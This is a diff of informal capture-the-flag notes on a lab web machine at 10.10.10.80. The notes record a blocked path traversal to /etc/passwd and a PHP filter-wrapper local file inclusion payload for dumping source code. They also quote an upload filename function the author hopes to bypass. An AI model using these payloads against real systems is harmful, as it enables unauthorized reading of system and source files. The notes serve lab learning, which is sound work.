@@ -35,10 +35,23 @@ READ THE SOURCE LUKE
 10.10.10.80/?op=../../../../../../../../../etc/passwd
 Are you really trying ../../../../../../../../../etc/passwd!? Did we Time Travel? This isn't the 90's
 
+I know there an way to download the file ( to do LFI)
 
+work to get index.php in base64 encoding
+http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=index
 
+ and other files just change index to the file you want.
+ 
+ is there an way to control the filename of the uploaded files? 
+ 
+ The function for generating file name.
+ function genFilename() {
+	return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
+}
 
-
+sha1 always produce a hashed message of 40character, of what seems to be random. 
+the most logical, it what I somehow need to bypass the genprocess ? 
+ 
 
 
 
